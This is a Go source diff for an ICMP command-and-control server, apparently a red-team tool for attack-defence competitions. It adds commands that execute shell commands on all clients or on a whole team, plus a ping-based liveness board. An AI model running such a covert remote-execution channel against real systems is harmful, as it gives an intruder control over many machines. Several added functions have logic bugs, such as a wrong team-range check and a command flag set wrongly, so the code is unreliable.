@@ -10,6 +10,7 @@ import (
 	"sort"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/pcap"
@@ -18,6 +19,7 @@ import (
 )
 
 var clients = make(map[int]string)
+var ALIVE = make(map[string]bool)
 var PacketQueue []icmp.Message
 var SSM bool = false
 var execute = false
@@ -28,6 +30,7 @@ var (
 	buffer = int32(1600)
 	filter = "icmp[icmptype] == icmp-echoreply"
 )
+var NumOfTeams int
 
 func print_title() {
 	fmt.Println(".__                          ___             .__.__    ___")
@@ -37,7 +40,6 @@ func print_title() {
 	fmt.Println("|__|\\___  |____/|   __/    \\  \\   \\___  >\\_/ |__|____/  /  /")
 	fmt.Println("        \\/      |__|        \\__\\      \\/               /__/")
 	fmt.Println("We are so back.")
-	fmt.Println("Type \"help\" for list of commands.")
 }
 
 func print_help() {
@@ -47,14 +49,14 @@ func print_help() {
 	fmt.Println("\tremoveallclients               Removes all clients")
 	fmt.Println("\tsend <ID> <message>            Send message to client at ID")
 	fmt.Println("\texe <ID> <command>             Send command to client at ID")
-	// fmt.Println("\tsendtoall <message>            Sends <message> to all clients")
-	// fmt.Println("\texeonall <command>             Execute <command> on all clients")
-	// fmt.Println("\tsendtoteam <team> <command>    Send <command> to all <team> clients")
-	// fmt.Println("\texeonteam <team> <command>     Execute <command> on all <team> clients")
+	fmt.Println("\tsendtoall <message>            Sends <message> to all clients")
+	fmt.Println("\texeonall <command>             Execute <command> on all clients")
+	fmt.Println("\tsendtoteam <team> <command>    Send <command> to all <team> clients")
+	fmt.Println("\texeonteam <team> <command>     Execute <command> on all <team> clients")
 	fmt.Println("\tsendtobox <ip> <message>       Send <message> on all teams at 1.1.x.1 box")
 	fmt.Println("\texeonbox <1.1.x.1> <command>   Execute <command> on all teams at 1.1.x.1 box")
 	fmt.Println("\tload                           Loads all clients specified in targets.txt")
-	// fmt.Println("\tcheckalive                     Generates a board of replying clients")
+	fmt.Println("\tcheckalive                     Generates a board of replying clients")
 	// [FIX] fmt.Println("\tshell <ID>                     Creates a direct line with client at ID")
 	fmt.Println("\tkill                           Stops server")
 	fmt.Println("\tssm                            Toggles Super Secret Mode")
@@ -82,15 +84,20 @@ func RemoveAllClients() {
 }
 
 func ShowClients() {
+	keys := SortMap()
+	for _, k := range keys {
+		ClientString := "ID: " + strconv.Itoa(k) + ", IP: " + clients[k]
+		fmt.Println(ClientString)
+	}
+}
+
+func SortMap() []int {
 	keys := make([]int, 0, len(clients))
 	for k := range clients {
 		keys = append(keys, k)
 	}
 	sort.Ints(keys)
-	for _, k := range keys {
-		ClientString := "ID: " + strconv.Itoa(k) + ", IP: " + clients[k]
-		fmt.Println(ClientString)
-	}
+	return (keys)
 }
 
 func LoadClients() {
@@ -100,8 +107,45 @@ func LoadClients() {
 	}
 	fileScanner := bufio.NewScanner(readFile)
 	fileScanner.Split(bufio.ScanLines)
+	FirstLine := true
 	for fileScanner.Scan() {
-		AddClient(fileScanner.Text())
+		if FirstLine == true {
+			NumOfTeams, _ = strconv.Atoi(fileScanner.Text())
+			fmt.Println("Number of Teams:", NumOfTeams)
+			FirstLine = false
+		} else {
+			AddClient(fileScanner.Text())
+		}
+	}
+}
+
+func SendToTeam(team int, message string) {
+	if NumOfTeams == 0 {
+		fmt.Println("[ERROR] No teams loaded.")
+	}
+	if team > NumOfTeams || team < NumOfTeams {
+		fmt.Println("[ERROR] Invalid team.")
+	}
+	teamnum := 1
+	i := 0
+	fmt.Println("Team:", teamnum)
+	for clientindex := 0; clientindex < len(clients); clientindex++ {
+		fmt.Println("ID:", clientindex)
+		if teamnum == team {
+			Send(message, clientindex)
+		}
+		if i == len(clients)/NumOfTeams-1 {
+			teamnum++
+			i = 0
+			continue
+		}
+		i++
+	}
+}
+
+func SendToAll(message string) {
+	for id := range clients {
+		Send(message, id)
 	}
 }
 
@@ -283,12 +327,43 @@ func sniffer() {
 			// get the part before "]"
 			ip := parts[0]
 
-			fmt.Println("before:", header)
-			fmt.Println("inner:", ip)
-			fmt.Println("after:", parts[1])
+			fmt.Println("Header:", header)
+			fmt.Println("IP:", ip)
+			fmt.Println("Response:", parts[1])
+			if parts[1] == "pong" {
+				ALIVE[ip] = true
+			}
 		} else {
 			continue
 		}
+	}
+}
+
+func CheckAlive() {
+	if NumOfTeams == 0 {
+		fmt.Println("No Clients Loaded.")
+		return
+	}
+	keys := SortMap()
+	i := 0
+	teamnumber := 1
+	fmt.Printf("Team%3d: ", teamnumber)
+	for id := range keys {
+		if ALIVE[clients[id]] == true {
+			fmt.Printf("\033[92m[%2d]\033[0m", id)
+		} else {
+			fmt.Printf("\033[91m[%2d]\033[0m", id)
+		}
+		if i == len(clients)/NumOfTeams-1 {
+			fmt.Println()
+			i = 0
+			teamnumber++
+			if teamnumber != NumOfTeams+1 {
+				fmt.Printf("Team%3d: ", teamnumber)
+			}
+			continue
+		}
+		i++
 	}
 }
 
@@ -297,6 +372,7 @@ func main() {
 		fmt.Println(ListenerError)
 	}
 	print_title()
+	fmt.Println("Type \"help\" for list of commands.")
 	for {
 		consoleReader := bufio.NewReader(os.Stdin)
 		fmt.Print(">> ")
@@ -327,6 +403,7 @@ func main() {
 			ShowClients()
 		case "load":
 			LoadClients()
+			SortMap()
 		case "send":
 			execute = false
 			message, id := ParseID(tokens)
@@ -335,14 +412,28 @@ func main() {
 			execute = false
 			FixMe := strings.Split(tokens[1], " ")
 			SendToBox(FixMe[0], FixMe[1])
-		case "exeonbox":
-			execute = true
-			FixMe := strings.Split(tokens[1], " ")
-			SendToBox(FixMe[0], FixMe[1])
+		case "sendtoteam":
+			execute = false
+			message, team := ParseID(tokens)
+			SendToTeam(team, message)
+		case "sendtoall":
+			execute = false
+			SendToAll(tokens[1])
 		case "exe":
 			execute = true
 			message, id := ParseID(tokens)
 			Send(message, id)
+		case "exeonbox":
+			execute = true
+			FixMe := strings.Split(tokens[1], " ")
+			SendToBox(FixMe[0], FixMe[1])
+		case "exeonteam":
+			execute = false
+			message, team := ParseID(tokens)
+			SendToTeam(team, message)
+		case "exeonall":
+			execute = true
+			SendToAll(tokens[1])
 		case "ssm":
 			if SSM {
 				SSM = false
@@ -351,6 +442,13 @@ func main() {
 				SSM = true
 				fmt.Println("[DEBUG] Super Secret Mode enabled.")
 			}
+		case "checkalive":
+			for _, ip := range clients {
+				ALIVE[ip] = false
+			}
+			SendToAll("ping")
+			time.Sleep(5000 * time.Millisecond)
+			CheckAlive()
 		case "kill":
 			print_title()
 			os.Exit(0)
@@ -359,16 +457,3 @@ func main() {
 		}
 	}
 }
-
-// For later dont even look
-// func DisplayHosts(hosts []string, numTeams int) {
-// 	hostsPerTeam := len(hosts) / numTeams
-// 	teams := make([]string, numTeams)
-// 	for i, host := range hosts {
-// 		team := i / hostsPerTeam
-// 		teams[team] += host + " "
-// 	}
-// 	for _, team := range teams {
-// 		fmt.Println(team)
-// 	}
-// }
